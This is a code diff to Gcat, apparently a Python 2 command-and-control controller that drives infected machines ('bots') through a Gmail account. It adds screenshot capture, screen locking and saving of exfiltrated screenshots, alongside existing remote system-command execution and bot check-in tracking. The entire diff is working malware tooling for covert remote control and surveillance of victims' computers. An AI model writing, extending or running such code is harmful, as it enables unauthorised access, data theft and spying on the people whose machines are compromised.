@@ -8,6 +8,8 @@ import ast
 import os
 import random
 
+from datetime import datetime
+from base64 import b64decode
 from smtplib import SMTP
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
@@ -27,15 +29,19 @@ def genJobID(slen=7):
 class msgparser:
 
     def __init__(self, msg_data):
-        self.getText(msg_data)
+        self.attachment = None
+        self.getPayloads(msg_data)
         self.getSubjectHeader(msg_data)
         self.getDateHeader(msg_data)
 
-    def getText(self, msg_data):
+    def getPayloads(self, msg_data):
         for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
             if payload.get_content_maintype() == 'text':
                 self.text = payload.get_payload()
                 self.dict = ast.literal_eval(payload.get_payload())
+
+            elif payload.get_content_maintype() == 'application':
+                self.attachment = payload.get_payload()
 
     def getSubjectHeader(self, msg_data):
         self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
@@ -49,7 +55,7 @@ class Gcat:
         self.c = imaplib.IMAP4_SSL(server)
         self.c.login(gmail_user, gmail_pwd)
 
-    def sendEmail(self, botid, jobid, cmd, arg, attachment=[]):
+    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):
         msg = MIMEMultipart()
         msg['From'] = 'gcat:{}:{}'.format(botid, jobid)
         msg['To'] = gmail_user
@@ -72,18 +78,20 @@ class Gcat:
         mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
         mailServer.quit()
 
+        print "[*] Command sent successfully with job id: {}".format(jobid)
+
 
     def checkBots(self):
         bots = []
         self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(UNSEEN)")
+        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:')")
 
         for idn in idlist[0].split():
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
             msg = msgparser(msg_data)
             
             try:
-                botid = str(uuid.UUID(msg.subject))
+                botid = str(uuid.UUID(msg.subject.split(':')[1]))
                 if botid not in bots:
                     bots.append(botid)
                     
@@ -95,7 +103,7 @@ class Gcat:
     def getBotInfo(self, botid):
 
         self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(SUBJECT '{}')".format(botid))
+        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:{}')".format(botid))
 
         for idn in idlist[0].split():
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
@@ -111,7 +119,7 @@ class Gcat:
 
     def getJobResults(self, botid, jobid):
         self.c.select(readonly=1)
-        rcode, idlist = self.c.uid('search', None, "(UNSEEN SUBJECT '{}:{}')".format(botid, jobid))
+        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'imp:{}:{}')".format(botid, jobid))
 
         for idn in idlist[0].split():
             msg_data = self.c.uid('fetch', idn, '(RFC822)')
@@ -123,6 +131,15 @@ class Gcat:
             print ''
             print msg.dict['MSG']['RES']
 
+            if msg.attachment:
+
+                if msg.dict['MSG']['CMD'] == 'screenshot':
+                    imgname = '{}-{}.png'.format(botid, jobid)
+                    with open("./data/" + imgname, 'wb') as image:
+                        image.write(b64decode(msg.attachment))
+                        image.close()
+
+                    print "[*] Screenshot saved to ./data/" + imgname
             return
 
     def logout():
@@ -136,6 +153,8 @@ if __name__ == '__main__':
     parser.add_argument('--job-id', dest='jobid', type=str, help='Job id to retrieve')
     parser.add_argument("-i", dest='info', action='store_true', help='Retrieve info on specified client')
     parser.add_argument("-c", metavar='cmd', dest='cmd', type=str, help='Execute a system command')
+    parser.add_argument("-s", dest='screen', action='store_true', help='Take a screenshot')
+    parser.add_argument("-L", dest='lockscreen', action='store_true', help='Lock the clients screen')
     
     if len(sys.argv) is 1:
         parser.print_help()
@@ -144,6 +163,7 @@ if __name__ == '__main__':
     args = parser.parse_args()
     
     gcat = Gcat()
+    jobid = genJobID()
 
     if args.list:
         gcat.checkBots()
@@ -152,10 +172,13 @@ if __name__ == '__main__':
         gcat.getBotInfo(args.id)
 
     elif args.cmd:
-        jobid = genJobID()
         gcat.sendEmail(args.id, jobid, 'cmd', args.cmd)
-        print "[*] Command sent successfully with job id: {}".format(jobid)
+
+    elif args.screen:
+        gcat.sendEmail(args.id, jobid, 'screenshot')
+
+    elif args.lockscreen:
+        gcat.sendEmail(args.id, jobid, 'lockscreen')
 
     elif args.jobid:
         gcat.getJobResults(args.id, args.jobid)
-
